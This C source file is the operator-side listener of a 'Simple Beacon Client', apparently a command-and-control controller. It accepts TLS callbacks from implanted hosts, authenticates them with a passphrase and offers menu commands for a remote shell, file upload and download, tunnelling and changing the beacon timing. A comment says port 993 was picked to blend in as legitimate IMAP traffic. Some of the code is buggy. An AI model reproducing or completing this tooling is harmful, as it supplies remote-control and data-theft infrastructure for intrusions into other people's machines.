#include "client.h"

#define USAGE                                                                 \
"usage:\n"                                                                    \
"  echoclient [options]\n"                                                    \
"options:\n"                                                                  \
"  -a                  Address to send the message.\n"                        \
"  -p                  Port to send to.\n"                                    \
"  -h                  Show this help message\n"                              \

/* OPTIONS DESCRIPTOR ====================================================== */
static struct option gLongOptions[] = {
  {"authenticate",     required_argument,      NULL,           'a'},
  {"port",             required_argument,      NULL,           'p'},
  {"help",             no_argument,            NULL,           'h'},
  {NULL,               0,                      NULL,             0}
};

/**
 * Upon recieving a connection, establish an SSL session, authenticate to the server, and kick off 
 * the cmdloop so that the user can choose what to do while in a session with the server.
 */
int entersession(SSL *ssl, char *auth) {
  uint8_t buf[4096] = {0};
  int sd, exit = 0;

  // Accept the inbound SSL connection
  while(SSL_accept(ssl) != 1) {continue;}
  
  // Do not bother the application with retry data
  SSL_set_mode(ssl, SSL_MODE_AUTO_RETRY);

  // Print the encryption cipher suite that was negotiated
  printf("[+] Connected with %s encryption\n", SSL_get_cipher(ssl));

  // Read the message sent which should be a request to authenticate "authenticate" is passed.
  if ((ssl_readall(ssl, buf, 3) < 0)) {     
    exit = FAIL;
    goto cleanup;
  }         
  if (strcmp((char *)buf, "10") != 0) {
    fprintf(stderr, "[-] Server did not indicate it was ready for authentication. Recieved: %s.\n", buf);                             
    exit = FAIL;
    goto cleanup;
  }
  printf("[+] Server is ready for authentication.\n");

  // Send the authentication message
  printf("[*] Authenticating with: %s\n", auth);
  memset(buf, 0, sizeof(buf));
  sprintf((char *)buf, "%s", auth);
  if (ssl_writeall(ssl, buf, sizeof(buf)) < 0) {
    exit = FAIL;
    goto cleanup;
  }
  printf("[*] Authentication message sent.\n");
  
  // Check to make sure the server is happy with the auth message
  //  3 shots at getting the right message else server initiates disconnect.
  memset(buf, 0, sizeof(buf));
  if (ssl_readall(ssl, buf, 3) < 0) {
    fprintf(stderr, "[-] Error reading from the server. Exiting now.\n");
    exit = FAIL;
    goto cleanup;
  }
  while(strcmp((char *)buf, "50") == 0) {
    fprintf(stderr, "[-] Authentication messages did not match. Please input the proper message.\n");
    printf("> Enter Authentication Message: ");
    memset(buf, 0, sizeof(buf));
    fgets((char *)buf, 4096, stdin);
    printf("[*] About to send: %s", buf);
    if (ssl_writeall(ssl, buf, sizeof(buf)) < 0) {
      fprintf(stderr, "[-] Error writing new authentication message to the server. Exiting now.\n");
      exit = FAIL;
      goto cleanup;
    }
    memset(buf, 0, sizeof(buf));
    if (ssl_readall(ssl, buf, sizeof(buf)) < 0) {
      fprintf(stderr, "[-] Error reading from the server. Exiting now.\n");
      exit = FAIL;
      goto cleanup;
    }
  }
  free(auth);
  printf("[+] Successfully authenticated! Entering session.\n");

  // Print Help Menu and then enter into menued context
  displayhelp();
  while(1) {
    if (cmdloop(ssl) <= 0) {
      break;
    }
  }

  cleanup:
  sd = SSL_get_fd(ssl);                       // Get socket connection
  SSL_free(ssl);                              // Release SSL state
  close(sd);                                  // Close connection
  return exit;
}

/**
 * Dispaly the help menue while in a session with the server. This indcates what commands can be run
 * and what they are intedned to do for the user.
 */
void displayhelp() {
  fprintf(stderr, 
    "=====================================\n"
    "   Simple Beacon Client Help Menu\n"
    "=====================================\n"
    "sbc> new -- Spawn a new beacon.\n"
    "sbc> cmd -- Enter a shell.\n"
    "sbc> get -- Get a file.\n"
    "sbc> put -- Put up a file.\n"
    "sbc> tun -- Start a tunnel.\n"
    "sbc> win -- Change the beacon time.\n"
    "sbc> bye -- Exit the client.\n"
    "=====================================\n"
  );
}

/**
 * Determines which command the user wants to run from the interface, and runs the command returning the result 
 * from the called function to the entersession logic.
 */
int cmdloop(SSL* ssl) {
  uint8_t msg[4096] = {0};
  
  printf("sbc> ");
  fgets((char *)msg, 4096, stdin);
  msg[strcspn((char *)msg, "\r\n")] = 0;
  
  if ((strcmp((char *)msg, "new")) == 0) {
    return newconn(ssl);
  }
  if ((strcmp((char *)msg, "cmd")) == 0) {
    return cmdshell(ssl);
  }
  if ((strcmp((char *)msg, "get")) == 0) {
    return getfile(ssl);
  }
  if ((strcmp((char *)msg, "put")) == 0) {
    return putfile(ssl);
  }
  if ((strcmp((char *)msg, "tun")) == 0) {
    return tunnel(ssl);
  }
  if ((strcmp((char *)msg, "win")) == 0) {
    return winset(ssl);
  }
  if ((strcmp((char *)msg, "bye")) == 0) {
    ssl_writeall(ssl, (uint8_t *)"7", 2);
    return 0;
  }
  displayhelp();
  return SUCCESS;
}

/**
 * This is a helper function which removes trailing white space from the passed string.
 */
void trim(char *str) {
  int i = 0, index = -1;

  while(str[i] != '\0') {
    if(!isspace(str[i])) {
      index = i;
    }
    i++;
  }
  str[index+1] = '\0';
}

/**
 * Clear the prompt standard input to make sure we don't overflow buffers when reading in user input.
 */
void clearstdin() {
  int c; 
  while (c != '\n' && c != EOF) {
    c = getchar();
  }
}

/**
 * Parse and validate the command line arguments passed to the client.
 */
int parseargs(int argc, char **argv, char **auth, int *port) {
  int option_char;
  char *authentication;
  int portno;

  // Parse and set command line arguments
  while ((option_char = getopt_long(argc, argv, "a:p:h", gLongOptions, NULL)) != -1) {
    switch (option_char) {
      case 'a':         // The authentication string to utilize
        authentication = optarg;
        break;
      case 'p':         // The port number to send traffic to. 
        portno = atoi(optarg);
        break;
      case 'h':         // Help message
        fprintf(stdout, "%s", USAGE);
        exit(0);
        break;
      default:
        fprintf(stderr, "%s", USAGE);
        exit(1);
    }
  }

  // Bounds and intialization checking
  if ((portno <= 0) || (portno > 65535)) {
    fprintf(stderr, "[-] ERROR: %s @ %d: invalid port number (%d).\n", __FILE__, __LINE__, portno);
    return FAIL;
  }

  *auth = calloc((strlen(authentication)+1), sizeof(char));
  if (auth == NULL) {
    fprintf(stderr, "[-] ERROR: Failed to allocate memory for the message.\n");
    return FAIL;
  }

  // Assign variable contents
  memcpy(*auth, authentication, (strlen(authentication)+1));
  (*port) = portno;

  return SUCCESS;
}

/**
 * Helper function properly load the ssl certs into memory.
 */
void loadcert(SSL_CTX* ctx, char *cert, char *key) {
    // Set the local certificate from CertFile
    if (SSL_CTX_use_certificate_file(ctx, cert, SSL_FILETYPE_PEM) <= 0 ) {
        ERR_print_errors_fp(stderr);
        abort();
    }
    // Set the private key from KeyFile
    if (SSL_CTX_use_PrivateKey_file(ctx, key, SSL_FILETYPE_PEM) <= 0 ) {
        ERR_print_errors_fp(stderr);
        abort();
    }
    // Verify the private key
    if (!SSL_CTX_check_private_key(ctx) ) {
        fprintf(stderr, "[-] Private key does not match the public certificate\n");
        abort();
    }
}

/**
 * Helping function to intialize SSL helper libraries and establish contexts
 */
SSL_CTX* initCTX(void) {
  SSL_CTX *ctx;
  const SSL_METHOD *method;

  OpenSSL_add_all_algorithms();       // Load & register all cryptos, etc.
  SSL_load_error_strings();           // Load all error messages
  method = TLS_server_method();   // Create new server-method instance
  ctx = SSL_CTX_new(method);          // Create new context from method
  if (ctx == NULL) {                  // Check for errors
    ERR_print_errors_fp(stderr);
    abort();
  }

  return ctx;
}

/**
 * The main program logic. Kicks off a client to listen on the specified port. Upon receiving a connection
 * the client will attempt to authenticate with the specified authentication string. The SSL certificates 
 * must be stored on disk. Their relative location of the certificates to the sbc binary is defined in the 
 * header file. To kick off the client use the following command:
 * 
 * ./sbc -a "ASimplePasswordForASimpleTool" -p 993
 */
int main(int argc, char **argv) {
    int keepalive = 1;                      // Enable TCP keepalive probes for the socket
    int keepcnt = 3;                        // Send a maximum of 3 probes that are unanswered
    int keepidle = 5;                       // Send the first one after being idle for 5 seconds
    int keepintvl = 15;                     // Wait 15 seconds in between each TCP keepalive probe
    int port = SERVE_PORT;                  // Server port number -- IMAP SSL to potentially blend as legitimate SSL traffic.
    int serverfd;                           // The serverfd that will be where we pass messages.
    int sockfd;                             // The main listener socket file descriptor
    SSL *ssl;                               // The SSL session pointer that is associated with a given session.
    SSL_CTX *ctx;                           // SSL connection context pointer
    char *auth = NULL;                      // The authentication phrase 
    char ipstr[INET6_ADDRSTRLEN];           // The ip address string for the peer -- is large enough to hold the max IPv6 length address.
    struct sockaddr_storage peer;           // The storage space that will reveal the peer address information.
    struct sockaddr_storage server;         // The sockaddr for the server that is beaconing
    socklen_t socklen = sizeof(server);     // The socklen for the server that is beaconing 
    socklen_t peerlen;                      // The peerlen message that is required for printing out peer info.

    // Ensure the user is running as root
    if(getuid() != 0) {
        fprintf(stderr, "[-] This program must be run as root/sudo user!");
        exit(FAIL);
    }

    // Parse the arguments passed
    if (parseargs(argc, argv, &auth, &port) != SUCCESS) {
      fprintf(stderr, "[-] Bailing early due to previous error.");
      exit(FAIL);
    }

    // Initialize the SSL library
    SSL_library_init();                                                             
    ctx = initCTX();                                                                
    loadcert(ctx, (char *)CERT, (char *)CERT);                                     

    // Setup the core listening socket
    if (setuplistner(port, &sockfd) < 0) {exit(FAIL);}
    
    // Catch a connection and start a session
    if ((serverfd = accept(sockfd, (struct sockaddr *)&server, &socklen)) < 0) {exit(FAIL);}

    // Set keepalives
    if (setsockopt(serverfd, SOL_SOCKET, SO_KEEPALIVE, &keepalive, sizeof(int)) < 0) {exit(FAIL);}
    if (setsockopt(serverfd, IPPROTO_TCP, TCP_KEEPCNT, &keepcnt, sizeof(int)) < 0) {exit(FAIL);}
    if (setsockopt(serverfd, IPPROTO_TCP, TCP_KEEPIDLE, &keepidle, sizeof(int)) < 0) {exit(FAIL);}
    if (setsockopt(serverfd, IPPROTO_TCP, TCP_KEEPINTVL, &keepintvl, sizeof(int)) < 0) {exit(FAIL);}

    // Print who we are speaking to.
    peerlen = sizeof(peer);
    getpeername(serverfd, (struct sockaddr*)&peer, &peerlen);
    if (peer.ss_family == AF_INET) {
      struct sockaddr_in *p = (struct sockaddr_in *)&peer;
      port = ntohs(p->sin_port);
      inet_ntop(AF_INET, &p->sin_addr, ipstr, sizeof(ipstr));
    } else { // AF_INET6
      struct sockaddr_in6 *p = (struct sockaddr_in6 *)&peer;
      port = ntohs(p->sin6_port);
      inet_ntop(AF_INET6, &p->sin6_addr, ipstr, sizeof(ipstr));
    } 
    printf("[+] Established connection with server at %s:%d.\n", ipstr, port);
    
    // Establish an SSL connection
    ssl = SSL_new(ctx);                                                            
    SSL_set_fd(ssl, serverfd);                                                   
    
    // Enter into our session
    entersession(ssl, auth);                                                        
    
    // Clean up the memory space and gracefully exit.
    close(serverfd);                                                                
    SSL_CTX_free(ctx);                                                              
}